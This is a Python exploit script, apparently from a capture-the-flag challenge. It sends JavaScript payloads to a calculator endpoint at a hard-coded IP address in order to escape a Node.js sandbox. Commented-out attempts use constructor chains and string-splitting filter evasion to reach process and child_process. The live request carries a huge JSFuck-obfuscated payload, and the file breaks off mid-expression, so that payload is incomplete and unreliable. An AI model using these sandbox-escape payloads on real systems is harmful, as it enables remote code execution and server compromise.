import requests
import html
URL = "http://167.172.80.90:11037/calc"


def req(pay):
    res = requests.post(URL, json={
        "number": pay,
    })
    return res.text


# print(html.unescape(req("""
# try {
#     ({}.constructor.constructor("return Object.getOwnPropertyNames(th"+"is.pro"+"cess.removeListener())"))()
# } catch (err) {
#     construct = err.constructor.constructor
#     proc = construct('return th'+'is.pro'+'cess')
#     child = {}.constructor.constructor("proc.mainModule.requ"+"ire('child_pro'+'cess')")
#     ({}.constructor.constructor("return 6"))
# }
# """)))

"""
this
process
global
"""
# print(html.unescape(req("""
# try {
#     ({}.constructor.constructor("return th"+"is.pro"+"cess.removeListener()"))()
# } catch (err) {
#     construct = err.constructor.constructor
#     req = construct('return err.pro'+'cess.mainModule.req'+'uire')()
#     //child = {}.constructor.constructor("return req('child_pro'+'cess')")
#     //({}.constructor.constructor("return 6"))
# }
# """)))
print(html.unescape(req("""
[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]][[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]](([]+(+!![])+![]+(+!![])+!![]+(+!![])+![]+!![]+(+[])+(+!![])+![]+!![]+!![]+(+!![])+![]+(+[])+![]+(+!![])+![]+(+[])+(+!![])+(+!![])+![]+!![]+(+[])+(+!![])+(+!![])+(+!![])+(+[])+(+!![])+![]+![]+(+[])+(+!![])+![]+![]+(+!![])+(+!![])+!![]+(+[])+!![]+(+[])+![]+!![]+![]+(+!![])+(+[])+!![]+!![]+(+!![])+![]+!![]+(+[])+(+!![])+![]+(+!![])+(+[])+(+!![])+(+[])+(+!![])+(+!![])+(+!![])+!![]+(+[])+![]+(+!![])+!![]+(+[])+![]+(+!![])+![]+!![]+!![]+(+!![])+!![]+(+[])+![]+(+[])+![]+(+[])+(+[])+(+[])+!![]+!![]+(+!![])+(+[])+![]+(+[])+(+[])+(+!![])+![]+(+!![])+!![]+(+!![])+![]+!![]+(+[])+(+!![])+![]+!![]+!![]+(+!![])+![]+(+[])+![]+(+!![])+![]+(+[])+(+!![])+(+!![])+![]+!![]+(+[])+(+!![])+(+!![])+(+!![])+(+[])+(+!![])+![]+![]+(+[])+(+!![])+![]+![]+(+!![])+(+!![])+!![]+(+[])+!![]+(+[])+![]+!![]+![]+(+!![])+(+[])+(+!![])+(+!![])+(+!![])+!![]+(+[])+![]+(+!![])+!![]+(+[])+![]+(+!![])+![]+!![]+!![]+(+!![])+!![]+(+[])+![]+(+[])+!![]+![]+!![]+(+[])+(+[])+![]+![]+(+!![])+![]+(+!![])+!![]+(+!![])+![]+!![]+(+[])+(+!![])+![]+!![]+!![]+(+!![])+![]+(+[])+![]+(+!![])+![]+(+[])+(+!![])+(+!![])+![]+!![]+(+[])+(+!![])+(+!![])+(+!![])+(+[])+(+!![])+![]+![]+(+[])+(+!![])+![]+![]+(+!![])+(+!![])+!![]+(+[])+!![]+(+[])+![]+!![]+![]+(+!![])+(+[])+(+!![])+(+!![])+(+!![])+!![]+(+[])+![]+(+!![])+!![]+(+[])+![]+(+!![])+![]+!![]+!![]+(+!![])+!![]+(+[])+![]+(+[])+![]+(+[])+(+[])+(+[])+!![]+!![]+(+!![])+(+[])+![]+(+[])+(+[])+(+!![])+!![]+![]+!![]+(+!![])+!![]+!![]+(+!![])+(+[])+!![]+![]+!![]+(+[])+![]+(+[])+(+[])+(+[])+(+[])+![]+![]+(+!![])+![]+(+!![])+!![]+(+!![])+![]+!![]+(+[])+(+!![])+![]+!![]+!![]+(+!![])+![]+(+[])+![]+(+!![])+![]+(+[])+(+!![])+(+!![])+![]+!![]+(+[])+(+!![])+(+!![])+(+!![])+(+[])+(+!![])+![]+![]+(+[])+(+!![])+![]+![]+(+!![])+(+!![])+!![]+(+[])+!![]+(+[])+![]+!![]+![]+(+!![])+(+[])+(+!![])+(+!![])+(+!![])+!![]+(+[])+![]+(+!![])+!![]+(+[])+![]+(+!![])+![]+!![]+!![]+(+!![])+!![]+(+[])+![]+(+[])+![]+!![]+![]+(+!![])+!![]+(+[])+(+[])+(+!![])+!![]+(+[])+![]+(+!![])+![]+(+!![])+(+!![])+(+!![])+!![]+(+[])+(+[])+(+!![])+![]+(+[])+(+!![])+(+!![])+!![]+(+[])+![]+(+!![])+![]+(+!![])+(+!![])+(+!![])+(+!![])+(+[])+!![]+(+!![])+!![]+(+!![])+(+[])+(+!![])+![]+(+[])+(+!![])+(+!![])+![]+(+[])+!![]+(+!![])+![]+![]+!![]+(+!![])+(+!![])+(+!![])+(+[])+(+!![])+!![]+(+[])+![]+(+!![])+![]+(+[])+(+!![])+(+!![])+![]+(+[])+!![]+(+!![])+![]+(+!![])+(+!![])+(+[])+![]+(+[])+(+[])+(+[])+!![]+!![]+(+!![])+(+[])+![]+(+[])+(+[])+(+!![])+![]+(+!![])+![]+(+!![])+!![]+(+!![])+(+!![])+(+!![])+![]+!![]+![]+(+!![])+![]+(+[])+!![]+(+!![])+!![]+(+!![])+(+[])+(+!![])+![]+![]+(+!![])+(+!![])+![]+!![]+!![]+(+!![])+![]+!![]+![]+(+[])+![]+![]+(+[])+(+!![])+![]+(+!![])+(+!![])+(+!![])+!![]+(+[])+![]+(+!![])+!![]+(+[])+![]+(+!![])+(+!![])+(+[])+!![]+(+!![])+!![]+(+!![])+(+[])+(+!![])+!![]+(+[])+![]+(+[])+![]+!![]+(+[])+(+[])+![]+(+[])+(+[])+(+!![])+!![]+(+!![])+(+[])+(+!![])+!![]+(+[])+![]+(+!![])+![]+(+[])+(+!![])+(+!![])+![]+(+[])+!![]+(+!![])+![]+(+!![])+(+!![])+(+!![])+!![]+(+[])+!![]+(+[])+![]+![]+(+!![])+(+[])+![]+(+[])+(+[])+(+!![])+!![]+![]+!![]+(+[])+(+[])+![]+![]+(+[])+![]+(+[])+(+[])+(+[])+![]+(+[])+(+[])+(+[])+![]+(+[])+(+[])+(+[])+![]+(+[])+(+[])+(+!![])+!![]+(+[])+![]+(+!![])+![]+(+!![])+(+!![])+(+!![])+!![]+(+!![])+(+[])+(+!![])+!![]+(+!![])+(+!![])+(+!![])+!![]+(+[])+![]+(+!![])+![]+!![]+![]+(+[])+![]+(+[])+(+[])+(+!![])+!![]+(+!![])+(+[])+(+!![])+!![]+(+[])+![]+(+!![])+![]+(+[])+(+!![])+(+!![])+![]+(+[])+!![]+(+!![])+![]+(+!![])+(+!![])+(+!![])+!![]+(+[])+!![]+(+!![])+(+!![])+![]+!![]+(+[])+!![]+(+[])+(+!![])+(+!![])+(+!![])+!![]+(+!![])+(+[])+![]+!![]+![]+(+!![])+![]+(+!![])+!![]+(+!![])+![]+(+!![])+(+!![])+(+!![])+!![]+(+!![])+(+[])+(+!![])+(+!![])+(+!![])+(+[])+(+!![])+![]+![]+(+[])+(+!![])+![]+![]+(+!![])+(+!![])+!![]+(+[])+!![]+(+[])+![]+![]+(+[])+(+[])+![]+![]+(+!![])+(+[])+![]+!![]+![]+(+!![])+!![]+(+[])+(+[])+(+!![])+!![]+(+[])+![]+(+!![])+![]+!![]+!![]+(+!![])+![]+(+[])+!![]+(+!![])+![]+(+!![])+(+!![])+(+!![])+!![]+(+[])+!![]+(+!![])+!![]+(+[])+!![]+(+[])+![]+!![]+![]+(+!![])+![]+!![]+(+!![])+(+!![])+![]+(+[])+(+!![])+(+!![])+![]+![]+(+!![])+(+!![])+![]+!![]+![]+(+!![])+(+[])+!![]+(+!![])+(+!![])+![]+!![]+!![]+(+!![])+![]+(+!![])+(+[])+(+!![])+!![]+(+!![])+(+!![])+(+!![])+![]+!![]+(+[])+(+!![])+![]+(+!![])+(+!![])+(+[])+![]+!![]+![]+(+!![])+!![]+(+[])+![]+(+!![])+![]+(+!![])+(+!![])+(+!![])+!![]+(+[])+(+!![])+(+!![])+!![]+(+!![])+(+!![])+(+!![])+![]+![]+(+!![])+(+!![])+!![]+(+[])+![]+(+!![])+![]+(+!![])+(+!![])+(+[])+![]+![]+(+[])+(+[])+![]+(+!![])+!![]+(+!![])+![]+(+[])+!![]+(+!![])+![]+![]+(+[])+(+!![])+![]+![]+(+!![])+(+!![])+![]+!![]+(+[])+(+!![])+![]+(+!![])+(+[])+(+!![])+(+!![])+!![]+!![]+(+!![])+!![]+(+[])+(+[])+(+!![])+!![]+(+[])+![]+(+!![])+![]+!![]+!![]+(+!![])+![]+(+[])+!![]+(+!![])+![]+(+!![])+(+!![])+(+!![])+!![]+(+[])+!![]+(+!![])+!![]+(+[])+!![]+(+[])+![]+(+!![])+!![]+(+[])+![]+![]+(+!![])+(+[])+![]+!![]+![]+(+!![])+![]+(+!![])+(+!![])+(+!![])+!![]+![]+(+[])+(+!![])+![]+(+!![])+(+!![])+(+!![])+![]+(+[])+!![]+(+!![])+(+!![])+(+[])+!![]+(+!![])+!![]+![]+(+!![])+(+!![])+![]+!![]+![]+(+!![])+![]+(+[])+!![]+(+[])+![]+![]+(+[])+(+[])+![]+(+!![])+!![]+(+!![])+![]+!![]+(+[])+(+!![])+!![]+(+[])+!![]+(+[])+![]+(+!![])+!![]+(+[])+![]+![]+(+!![])+(+[])+!![]+![]+!![]+(+[])+(+[])+![]+![]+(+!![])+!![]+!![]+(+!![])+(+[])+!![]+![]+!![]+(+[])+(+[])+![]+![]+(+!![])+![]+(+[])+!![]+(+!![])+![]+!![]+!![]+(+!![])+![]+!![]+![]+(+!![])+!![]+(+[])+!![]+(+!![])+!![]+(+!![])+(+[])+(+[])+![]+(+[])+(+[])+(+!![])+!![]+![]+!![]+(+[])+![]+(+[])+(+[])+(+!![])+!![]+(+[])+!![]+(+!![])+!![]+(+!![])+(+[])+(+!![])+![]+(+[])+(+!![])+(+!![])+![]+(+[])+!![]+(+!![])+![]+![]+!![]+(+[])+![]+(+[])+(+[])+(+!![])+!![]+!![]+(+!![])+(+[])+![]+(+[])+(+[])+(+[])+!![]+!![]+(+!![])+(+[])+![]+(+[])+(+[])+(+!![])+![]+!![]+![]+(+!![])+![]+(+!![])+(+!![])+(+!![])+!![]+(+!![])+!![]+(+[])+![]+(+[])+(+[])+(+!![])+![]+(+!![])+!![]+(+!![])+![]+!![]+(+[])+(+!![])+![]+!![]+!![]+(+!![])+![]+(+[])+![]+(+!![])+![]+(+[])+(+!![])+(+!![])+![]+!![]+(+[])+(+!![])+(+!![])+(+!![])+(+[])+(+!![])+![]+![]+(+[])+(+!![])+![]+![]+(+!![])+(+!![])+!![]+(+[])+!![]+(+[])+![]+!![]+![]+(+!![])+(+[])+!![]+!![]+(+!![])+![]+!![]+(+[])+(+!![])+![]+(+!![])+(+[])+(+!![])+(+[])+(+!![])+(+!![])+(+!![])+!![]+(+[])+![]+(+!![])+!![]+(+[])+![]+(+!![])+![]+!![]+!![]+(+!![])+!![]+(+[])+![]+(+[])+![]+![]+(+[])+(+[])+![]+![]+(+!![])+(+[])+!![]+![]+!![]+(+[])+(+[])+![]+![]+(+!![])+!![]+(+[])+![]+(+!![])+![]+(+!![])+(+!![])+(+!![])+!![]+(+!![])+(+[])+(+!![])+!![]+(+!![])+(+!![])+(+!![])+!![]+(+[])+![]+(+!![])+![]+!![]+![]+(+[])+![]+(+[])+(+[])+(+!![])+!![]+(+[])+!![]+(+!![])+!![]+(+!![])+(+[])+(+!![])+![]+(+[])+(+!![])+(+!![])+![]+(+[])+!![]+(+!![])+![]+![]+!![]+(+[])+!![]+![]+!![])[[]+([]+![])[!![]+!![]+!![]]+(+([]+(!![]+!![])+(!![]+!![]+!![]+!![]+!![])))[[]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]][[]+([]+[][[]])[+!![]]+([]+![])[+!![]]+((+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]]+[])[[]+(+!![])+(+!![])]+([]+!![])[!![]+!![]+!![]]]](+([]+(!![]+!![]+!![])+(+[])))+([]+![])[!![]+!![]]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+!![])[+![]]]([]+!![])[[]+([][[]+([]+!![])[!![]+!![]+!![]]+([]+[][[]])[+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+!![])[!![]+!![]+!![]]+([]+![])[!![]+!![]+!![]]]()+[])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+[][[]])[+!![]]](!![]+!![]+!![])[[]+([]+![])[!![]+!![]+!![]]+(+([]+(!![]+!![])+(!![]+!![]+!![]+!![]+!![])))[[]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]][[]+([]+[][[]])[+!![]]+([]+![])[+!![]]+((+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]]+[])[[]+(+!![])+(+!![])]+([]+!![])[!![]+!![]+!![]]]](+([]+(!![]+!![]+!![])+(+[])))+([]+![])[!![]+!![]]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+!![])[+![]]]([]+![])[[]+([][[]+([]+!![])[!![]+!![]+!![]]+([]+[][[]])[+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+!![])[!![]+!![]+!![]]+([]+![])[!![]+!![]+!![]]]()+[])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+[][[]])[+!![]]](!![]+!![])[[]+((+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]]+[])[[]+(+!![])+(+!![])]+([]+![])[+!![]]+([]+!![])[+![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(+([]+(+!![])+(!![]+!![]+!![]+!![]+!![]+!![]+!![])))[[]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]][[]+([]+[][[]])[+!![]]+([]+![])[+!![]]+((+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]]+[])[[]+(+!![])+(+!![])]+([]+!![])[!![]+!![]+!![]]]](+([]+(!![]+!![])+(+[])))]([][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]][[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]]([]+([]+!![])[+!![]]+([]+!![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[!![]+!![]]+([]+!![])[+!![]]+([]+[][[]])[+!![]]+(![]+[+[]])[[]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+!![])[+![]]+([]+![])[+!![]]+([]+![])[!![]+!![]]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+![])[!![]+!![]+!![]]]()[[]+(+!![])+(+[])]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(![]+[+[]])[[]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+!![])[+![]]+([]+![])[+!![]]+([]+![])[!![]+!![]]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+![])[!![]+!![]+!![]]]()[[]+(+!![])+(+[])]+(![]+[+[]]+([]+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]])[+([]+(!![]+!![])+(+[]))])())[[]+((+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]]+[])[[]+(+!![])+(+!![])]+([]+![])[+!![]]+(+([]+(!![]+!![])+(!![]+!![]+!![]+!![]+!![])))[[]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]][[]+([]+[][[]])[+!![]]+([]+![])[+!![]]+((+[])[[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]]+[])[[]+(+!![])+(+!![])]+([]+!![])[!![]+!![]+!![]]]](+([]+(!![]+!![]+!![])+(+[])))]([][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]][[]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[+!![]]+([]+!![])[!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+!![])[+![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]]([]+([]+!![])[+!![]]+([]+!![])[!![]+!![]+!![]]+([]+!![])[+![]]+([]+!![])[!![]+!![]]+([]+!![])[+!![]]+([]+[][[]])[+!![]]+(+[![]]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[+([]+(+!![])+(+!![]))]+([]+![])[+[]]+([]+[])[[]+([]+![])[+[]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+[][[]])[+!![]]+([]+!![])[+![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+![])[!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[[]+(+!![])+(+[])]+([]+!![])[+!![]]]()[+([]+(+!![])+(+!![]))]+([]+[])[[]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+!![])[+![]]+([]+![])[+!![]]+([]+![])[!![]+!![]]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+([]+![])[+!![]]+([]+!![])[+![]]])[!![]+!![]+!![]]+([]+![])[!![]+!![]+!![]]]()[!![]+!![]]+([+[]]+([]+[])[[]+([]+[][[]+([]+![])[+[]]+([]+[][[]])[!![]+!![]+!![]+!![]+!![]]+([]+![])[!![]+!![]]+([]+![])[!![]+!![]]])[!![]+!![]+!![]]+(!![]+[][[]+([]+![])[+[]]+([]+![])[!![]+!![]]+